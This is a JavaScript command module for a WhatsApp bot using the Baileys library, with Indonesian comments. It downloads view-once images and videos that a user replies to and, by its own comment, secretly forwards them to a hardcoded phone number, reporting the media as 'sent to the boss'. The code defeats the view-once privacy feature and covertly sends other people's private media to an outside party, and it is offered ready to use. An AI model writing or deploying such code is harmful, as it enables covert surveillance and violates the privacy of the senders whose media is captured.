const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

async function viewonceCommand(sock, chatId, message) {
    // Extract quoted imageMessage or videoMessage from your structure
    const quoted = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const quotedImage = quoted?.imageMessage;
    const quotedVideo = quoted?.videoMessage;

    // Nomor tujuan khusus (087861232351 diubah ke format JID Baileys)
    const targetNomor = '6287861232351@s.whatsapp.net';

    if (quotedImage && quotedImage.viewOnce) {
        // Download and send the image
        const stream = await downloadContentFromMessage(quotedImage, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        
        // Kirim hasil gambar secara diam-diam ke nomor target (tanpa parameter { quoted: message })
        await sock.sendMessage(targetNomor, { image: buffer, fileName: 'media.jpg', caption: quotedImage.caption || '' });
        
        // Kirim konfirmasi ke chat tempat command diketik (opsional, bisa dihapus jika ingin bot diam saja)
        await sock.sendMessage(chatId, { text: '✅ Media view-once berhasil dikirim ke bos.' }, { quoted: message });

    } else if (quotedVideo && quotedVideo.viewOnce) {
        // Download and send the video
        const stream = await downloadContentFromMessage(quotedVideo, 'video');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
        
        // Kirim hasil video secara diam-diam ke nomor target
        await sock.sendMessage(targetNomor, { video: buffer, fileName: 'media.mp4', caption: quotedVideo.caption || '' });
        
        // Kirim konfirmasi ke chat tempat command diketik (opsional)
        await sock.sendMessage(chatId, { text: '✅ Media view-once berhasil dikirim ke bos.' }, { quoted: message });

    } else {
        // Pesan error tetap dikirim ke chat saat ini
        await sock.sendMessage(chatId, { text: '❌ Please reply to a view-once image or video.' }, { quoted: message });
    }
}

module.exports = viewonceCommand;
